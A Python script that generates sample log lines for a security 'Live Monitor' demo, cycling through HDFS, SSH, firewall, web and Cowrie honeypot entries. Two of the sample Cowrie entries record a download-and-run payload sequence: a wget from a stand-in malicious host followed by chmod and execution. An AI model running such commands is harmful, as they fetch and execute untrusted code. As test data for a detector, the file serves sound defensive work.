"""
Demo log generator.

Appends one sample log line every 2 seconds to backend/live/live_demo.log.
This simulates a live log source for the Live Monitor demo.

Usage (from project root):
    python backend/tools/log_generator.py

Stop with Ctrl+C.

In a real deployment, live_demo.log could be replaced by:
- web server access logs
- firewall logs
- SSH auth logs
- SIEM export files
- NMS log exports
"""

import itertools
import sys
import time
from pathlib import Path

LIVE_LOG = Path(__file__).resolve().parents[2] / "backend" / "live" / "live_demo.log"

SAMPLE_LOGS = [
    # Benign HDFS
    "081109 204512 26 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.251.203.166:50010 is added to blk_-2299586501391716260 size 67108864",
    "081109 203945 308 INFO dfs.DataNode$PacketResponder: Received block blk_-9207533323239283317 of size 67108864 from /10.251.111.130",
    "081109 204156 34 INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: 10.250.14.143:50010 is added to blk_8902874290653812711 size 67108864",
    "081109 204617 544 INFO dfs.DataNode$PacketResponder: PacketResponder 1 for block blk_3557914126063085372 terminating",
    # Malicious / suspicious SSH
    "Failed password for root from 192.168.1.25 port 55221 ssh2",
    "Failed password for admin from 10.0.0.44 port 48210 ssh2",
    "SSH client hassh fingerprint: 51cba57125523ce4b9db67714a90bf6e",
    "Remote SSH version: SSH-2.0-libssh-0.6.3",
    "login attempt [root/root] failed",
    "login attempt [ubuntu/ubuntu1234] succeeded",
    # Malicious commands (Cowrie)
    "CMD: cat /proc/cpuinfo | grep name | wc -l",
    "CMD: wget http://malicious.example.com/payload.sh -O /tmp/p.sh",
    "CMD: chmod +x /tmp/p.sh && /tmp/p.sh",
    "Closing TTY Log: var/lib/cowrie/tty/50e721e49c013f00c62cf59f2163542a9d8df02464efeb615d31051b0fddc326 after 0 seconds",
    # Firewall
    "firewall denied src=192.168.1.40 dst=10.0.0.5 port=22 protocol=tcp",
    "firewall allowed src=10.1.1.5 dst=10.0.0.1 port=443 protocol=tcp",
    # Web
    "GET /admin/login.php HTTP/1.1 404 Mozilla/5.0",
    "POST /wp-login.php HTTP/1.1 200 python-requests/2.28.1",
    "GET /index.html HTTP/1.1 200 Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    # Normal login
    "User login successful for admin from web portal 192.168.1.10",
]

cycle = itertools.cycle(SAMPLE_LOGS)


def main() -> None:
    LIVE_LOG.parent.mkdir(parents=True, exist_ok=True)
    print(f"[log_generator] Writing to: {LIVE_LOG}")
    print("[log_generator] Press Ctrl+C to stop.\n")

    try:
        while True:
            line = next(cycle)
            with open(LIVE_LOG, "a", encoding="utf-8") as f:
                f.write(line + "\n")
            print(f"[log_generator] >> {line[:90]}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[log_generator] Stopped.")
        sys.exit(0)


if __name__ == "__main__":
    main()
